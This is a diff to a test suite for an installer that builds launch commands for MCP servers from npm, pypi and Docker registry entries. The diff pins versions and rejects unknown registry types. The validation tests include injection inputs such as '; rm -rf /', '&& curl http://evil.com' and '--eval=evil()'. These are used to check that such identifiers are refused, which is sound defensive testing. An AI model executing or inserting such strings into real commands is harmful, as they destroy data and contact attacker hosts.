@@ -45,6 +45,7 @@ function makeServerEntry(overrides: Partial<ServerEntry["server"]> = {}): Server
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -730,6 +731,7 @@ describe("handleInstall — env var prompting", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [
             { name: "API_KEY", description: "Your API key", isRequired: true, isSecret: true },
           ],
@@ -756,6 +758,7 @@ describe("handleInstall — env var prompting", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [
             { name: "API_KEY", isRequired: true, isSecret: true },
           ],
@@ -860,6 +863,7 @@ describe("resolveInstallEntry — npm package", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -867,7 +871,7 @@ describe("resolveInstallEntry — npm package", () => {
     });
     const entry = resolveInstallEntry(server, "claude-desktop");
     expect(entry.command).toBe("npx");
-    expect(entry.args).toEqual(expect.arrayContaining(["-y", "@test/my-server"]));
+    expect(entry.args).toEqual(expect.arrayContaining(["-y", "@test/my-server@1.2.3"]));
   });
 
   it("includes runtime arguments in the args array", () => {
@@ -876,6 +880,7 @@ describe("resolveInstallEntry — npm package", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: ["--verbose", "--port=3000"],
         },
@@ -894,6 +899,7 @@ describe("resolveInstallEntry — named/positional runtimeArguments", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [{ type: "named", name: "-i" }],
         },
@@ -911,6 +917,7 @@ describe("resolveInstallEntry — named/positional runtimeArguments", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [{ type: "named", name: "--port", value: "8089" }],
         },
@@ -928,6 +935,7 @@ describe("resolveInstallEntry — named/positional runtimeArguments", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [{ type: "positional", value: "-y" }],
         },
@@ -943,6 +951,7 @@ describe("resolveInstallEntry — named/positional runtimeArguments", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [{ type: "positional", valueHint: "directory" }],
         },
@@ -960,6 +969,7 @@ describe("resolveInstallEntry — pypi package", () => {
         {
           registryType: "pypi",
           identifier: "my-python-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -967,7 +977,7 @@ describe("resolveInstallEntry — pypi package", () => {
     });
     const entry = resolveInstallEntry(server, "claude-desktop");
     expect(entry.command).toBe("uvx");
-    expect(entry.args).toContain("my-python-server");
+    expect(entry.args).toContain("my-python-server===1.2.3");
   });
 });
 
@@ -977,7 +987,7 @@ describe("resolveInstallEntry — docker/oci package", () => {
       packages: [
         {
           registryType: "oci",
-          identifier: "my-org/my-server:latest",
+          identifier: "my-org/my-server:1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -986,7 +996,7 @@ describe("resolveInstallEntry — docker/oci package", () => {
     const entry = resolveInstallEntry(server, "claude-desktop");
     expect(entry.command).toBe("docker");
     expect(entry.args).toEqual(
-      expect.arrayContaining(["run", "--rm", "-i", "my-org/my-server:latest"])
+      expect.arrayContaining(["run", "--rm", "-i", "my-org/my-server:1.2.3"])
     );
   });
 });
@@ -998,6 +1008,7 @@ describe("resolveInstallEntry — HTTP remote (Cursor prefers HTTP)", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1021,6 +1032,7 @@ describe("resolveInstallEntry — HTTP remote (Cursor prefers HTTP)", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1038,6 +1050,7 @@ describe("resolveInstallEntry — HTTP remote (Cursor prefers HTTP)", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1066,12 +1079,14 @@ describe("resolveInstallEntry — fallback priority: npm → pypi → oci", () =
         {
           registryType: "pypi",
           identifier: "my-python-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1086,13 +1101,14 @@ describe("resolveInstallEntry — fallback priority: npm → pypi → oci", () =
       packages: [
         {
           registryType: "oci",
-          identifier: "my-org/my-server:latest",
+          identifier: "my-org/my-server:1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
         {
           registryType: "pypi",
           identifier: "my-python-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1107,7 +1123,7 @@ describe("resolveInstallEntry — fallback priority: npm → pypi → oci", () =
       packages: [
         {
           registryType: "oci",
-          identifier: "my-org/my-server:latest",
+          identifier: "my-org/my-server:1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1448,7 +1464,7 @@ describe("validateIdentifier — pypi", () => {
 
 describe("validateIdentifier — oci", () => {
   it("accepts valid OCI image references with tag", () => {
-    expect(() => validateIdentifier("my-org/my-server:latest", "oci")).not.toThrow();
+    expect(() => validateIdentifier("my-org/my-server:1.2.3", "oci")).not.toThrow();
   });
 
   it("rejects OCI identifiers with shell metacharacters", () => {
@@ -1461,8 +1477,8 @@ describe("validateIdentifier — oci", () => {
 });
 
 describe("validateIdentifier — unknown registry type", () => {
-  it("does not throw for unknown registry types (no pattern to match)", () => {
-    expect(() => validateIdentifier("anything goes", "custom")).not.toThrow();
+  it("refuses unknown registry types", () => {
+    expect(() => validateIdentifier("anything goes", "custom")).toThrow(/Unsupported registry type/);
   });
 });
 
@@ -1673,6 +1689,7 @@ describe("resolveInstallEntry — identifier validation", () => {
         {
           registryType: "npm",
           identifier: "@test/server; rm -rf /",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -1687,6 +1704,7 @@ describe("resolveInstallEntry — identifier validation", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: ["--eval=evil()"],
         },
@@ -1701,6 +1719,7 @@ describe("resolveInstallEntry — identifier validation", () => {
         {
           registryType: "pypi",
           identifier: "server && curl http://evil.com",
+          version: "1.2.3",
           environmentVariables: [],
           runtimeArguments: [],
         },
@@ -2403,6 +2422,7 @@ describe("handleInstall — plaintext secret warning", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           runtimeArguments: [],
           environmentVariables: [
             { name: "API_KEY", description: "The API key", isRequired: true, isSecret: true },
@@ -2435,6 +2455,7 @@ describe("handleInstall — plaintext secret warning", () => {
         {
           registryType: "npm",
           identifier: "@test/my-server",
+          version: "1.2.3",
           runtimeArguments: [],
           environmentVariables: [
             { name: "API_KEY", description: "The API key", isRequired: true, isSecret: true },
